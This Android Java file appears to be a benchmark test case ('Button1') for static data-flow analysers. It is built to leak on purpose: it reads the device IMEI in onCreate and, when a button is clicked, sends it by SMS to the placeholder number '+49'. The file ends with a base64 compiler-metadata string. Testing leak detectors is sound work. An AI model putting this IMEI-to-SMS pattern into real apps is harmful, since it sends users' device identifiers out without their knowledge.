package de.ecspride;

import android.app.Activity;
import android.content.Context;
import android.os.Bundle;
import android.telephony.SmsManager;
import android.telephony.TelephonyManager;
import android.view.View;
import android.widget.Toast;

/**
 * @testcase_name Button1
 * @version 0.1
 * @author Secure Software Engineering Group (SSE), European Center for Security
 and Privacy by Design (EC SPRIDE) 
 * @author_mail siegfried.rasthofer@cased.de
 * 
 * @description The sink is called after the user clicks a button. The button
 *  handler is defined via XML.
 * @dataflow OnCreate: source -> imei; sendMessage: imei -> sink
 * @number_of_leaks 1
 * @challenges the analysis must analyze the layout xml file and take the
 lifecycle into account (onCreate is executed before user interaction)
 */
public class Button1 extends Activity {
    private static String imei = null;
    
    @Override
    protected void onCreate(Bundle savedInstanceState) {
        super.onCreate(savedInstanceState);
        setContentView(R.layout.activity_button1);
        TelephonyManager telephonyManager =
          (TelephonyManager) getSystemService(Context.TELEPHONY_SERVICE);
        imei = telephonyManager.getDeviceId();
    }
    
    public void sendMessage(View view) {
        Toast.makeText(this, imei, Toast.LENGTH_LONG).show();
        SmsManager sms = SmsManager.getDefault();
        sms.sendTextMessage("+49", null, imei, null, null);
    }
    
    public Button1() { super(); }
    
    public static final String jlc$CompilerVersion$jl7 = "2.7.1";
    public static final long jlc$SourceLastModified$jl7 = 1450032968000L;
    public static final String jlc$ClassType$jl7 =
      ("H4sIAAAAAAAAAMVYfWwcxRWfW387Ts52Eid1E8exTSAh3BJaIlWmNM4RE6fn" +
       "2I0TA9eWy3h3zrfx3O6yO3e+OHWbRKJJ+SNCYCBI4L+CCigQhIpAqqiMEF/i" +
       "Q6JC/ZIKiH8IpZHIH3yoaUvfzH7v2Ub81ZNuZm523ps37/3eb97e+UuozrbQ" +
       "taZBj05Sg6VIhaWO0BtT7KhJ7NS+zI2j2LKJmqbYtg/CXE7peSb5xZV7C60S" +
       "qs+i1VjXDYaZZuj2AWIbtEzUDEoGs3soKdoMtWaO4DKWS0yjckazWX8GrQiJ" +
       "MtSX8UyQwQQZTJCFCfJAsAqEVhK9VExzCawz+y70S5TIoHpT4eYxtDmqxMQW" +
       "LrpqRsUJQEMj/z0OhxLCFQt1+2d3zlx14AeuleceurP12RqUzKKkpo9xcxQw" +
       "gsEmWdRSJMUJYtkDqkrULGrTCVHHiKVhqs0Iu7Oo3dYmdcxKFvGdxCdLJrHE" +
       "noHnWhR+NqukMMPyj5fXCFW9X3V5iifhrB3BWZ0TDvJ5OGCzBoZZeawQT6R2" +
       "StNVhjbFJfwz9v0YFoBoQ5GwguFvVatjmEDtTuwo1iflMWZp+iQsrTNKsAtD" +
       "nUsq5b42sTKFJ0mOofXxdaPOI1jVJBzBRRhaG18mNEGUOmNRCsXn0v6bzhzT" +
       "9+qSsFklCuX2N4JQV0zoAMkTi+gKcQRbtmUexB0vnpYQgsVrY4udNc//4vKu" +
       "7V0LrztrvrvImpGJI0RhOeXcxKp3N6S3/qCGm9FoGrbGgx85uYD/qPukv2JC" +
       "5nX4GvnDlPdw4cCrdxx/knwqoeYhVK8YtFQEHLUpRtHUKLFuJTqxMCPqEGoi" +
       "upoWz4dQA4wzmk6c2ZF83iZsCNVSMVVviN/gojyo4C5qgLGm5w1vbGJWEOOK" +
       "iRBqgC9qgW8HQjXb3f5qhph8yAa4y4VpfKSkT2YIkW8hZUINCKJ8m2FN2RB1" +
       "Iu/jmLnFMjR1N3i8IENYNNMm15mWwf0lpzGlE4ABW95dYszQd8i2pcgqgYW2" +
       "aWkwcOdTHH3m/2nfCvdH63QiAaHaECcKCvvtNahKrJwyV9q95/LTuTclP3Fc" +
       "TzK0WiUpT3nKVY4SCaFzDd/ECT0EbgooAMixZevYz/cdPt1TA5gzp2vB9Xyp" +
       "vDRHpwPSGBLUqABy0cLZ6RPjv7peQlKUbLlhMNXMxUc5RfpU2BdPssX0Jk9d" +
       "/OLCg7NGkG4R9nZZoFqSZ3FP3IWWoRAVeDFQv60bP5d7cbZPQrVADUCHDAN8" +
       "gWm64ntEsrnfY0Z+ljo4cN6wipjyRx6dNbOCZUwHMyK2q3jT7oSZxyNmoCDV" +
       "H46Zj/7lnU++Jzzp8W8ydKONEdYfynmuLCmyuy0I70GLEFj397Oj9z9w6dRP" +
       "RWxhRe9iG/bxNg25DtEBD979+l1//eD9c+9JAR4YXHqlCaopFXGWtq/hk4Dv" +
       "f/mXJy6f4D3Qd9oljW6fNUy+85bANuAPCrnBwdF3SC8aqpbX8AQlHIz/Tl61" +
       "47l/nml1wk1hxkPL9m9WEMx/Zzc6/uadX3YJNQmF31+B/4JlDimuDjQPWBY+" +
       "yu2onPjjxodfw48CvQKl2doMESyFhD+QCKAsfLFNtKnYsx282WSHMR5No1Cd" +
       "kVPufe+zleOf/eGysDZaqITjPozNfgdFThRgsy3IbThbDno9f7ra5O2aCtiw" +
       "Lp71e7FdAGXfX9j/s1a6cAW2zcK2Clzh9ogF/FKJQMldXdfwt5de7jj8bg2S" +
       "BlEzNbA6iEXCoSZAOrELQE0V80e7kPhMN0LTKvyBqjzkoGi9zzVbl+aaQV6M" +
       "BOm6/l8jdOLkR19VeUqwzCJ3cEw+K59/pDN986dCPkh3Lt1VqeZcKNwC2Rue" +
       "LH4u9dS/IqGGLGpV3KpwHNMSz7QsVEK2VypC5Rh5Hq1qnCu836ezDXGqCW0b" +
       "J5qA62HMV/NxcwwVwu+98F0HaJhy+9vDqEggMdglRLpF28ubLSImEkMNcH+U" +
       "IXkh821RgFZ87QmuPelqvc3th0LaGdzzRaIJgbVQjAso8ZOnnHrOYT/e3sCb" +
       "AUf1zsWgU1ncwAQfXh2YJD71Lvy9dOgOmRQCHOIpsXGp+k7UpudOzs2rI4/t" +
       "cKqw9mjNtAdeCZ7603/eSp398I1Frt8mZpjXUV4phPaUYMttS4N8WNTBAdJe" +
       "O/mPzoM3Fw5/i7t0U+xAcZVPDJ9/49Ytyn0SqvFxV1WhR4X6o2hrtgi8UugH" +
       "I5jb6IdgFXftTvh2guufdft7wpgLwl4dT/AbVEwM0oKoQVhFuFa6un7j9sfj" +
       "YQ0YOOEyigu8NqyrvDJLGTYUQrpKibAhtwxvK7y5naFGQ09bBPC/PDuNWloR" +
       "7uCyW+HLs+0fTD1y8SkHN3Eqii0mp+fu+Tp1Zk4KvTP1Vr22hGWc9yZh50re" +
       "XMORvHm5XYTE4McXZn//+OwpyT3jTyA/y+CWIAPviGZgi5+BvivbgxweKROL" +
       "15bLJG0144uJQ35gV3jXVg8E+aLbv70EWHgzHMVEsyvyltu/+u0xUdbIdGoc" +
       "GrHV9DKYOMYbqAhX2PCWMwx3JLxH8qlC4EB7GQqrvv2AXd26nFcf66v+EHBe" +
       "YpWn55ON6+YP/VmUpv6LZhNUfvkSpeF7IDSuNy2S14TdTc6tYIruJNgfejEA" +
       "hHtDYd8JZ9XdDEmqUPVr0/PYGs9j2DRTA1A2lTV2tJKIMqrvifZv8kSIhHsj" +
       "iSX+PvHYq+T8gZJTLszv23/s8s7HnGJYoXhmhmtpzKAGp+T2GXDzkto8XfV7" +
       "t15Z9UzTVV4iRIrxmG2bFq829xRNJurDmRfW/e6m386/L4rk/wGOuJ9U1xIA" + "AA==");
}
